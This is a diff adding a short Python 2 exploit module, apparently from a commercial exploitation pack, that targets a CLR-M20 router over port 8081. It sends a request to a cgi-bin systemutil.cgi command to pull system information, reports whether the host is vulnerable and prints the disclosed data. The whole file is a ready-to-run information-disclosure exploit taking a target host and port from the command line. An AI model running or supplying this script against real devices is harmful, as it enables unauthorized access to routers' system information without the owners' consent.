@@ -1,0 +1,42 @@
+#! /usr/bin/env python2
+ 
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2019
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import requests
+
+_name_   = 'd2sec_link_25'
+_vendor_ = 'd-link'
+_model_  = ['CLR-M20']
+_vuln_   = 'Information Disclosure Vulnerability'
+_cve_    = ''
+_ref_    = 'https://packetstormsecurity.com/files/150938/celalinkclrm20-disclose.txt'
+_port_   = 8081
+
+def pwnrouter(host,port=_port_):
+  try:
+    url = 'http://%s:%d/cgi-bin/systemutil.cgi?Command=SystemInfoCmTlsq' % (host,port)    
+    response = requests.get(url)
+  except Exception, e:
+    print '[-] error : %s' % e
+    return
+  if response is None:
+    print '[+] %s not vulnerable' % host
+    return      
+  if 'Uicc_Pin_status' in response.text:
+    print '[+] %s vulnerable\n' % host
+    print response.text        
+  else:            
+    print '[+] %s not vulnerable' % host
+
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1], int(sys.argv[2]))
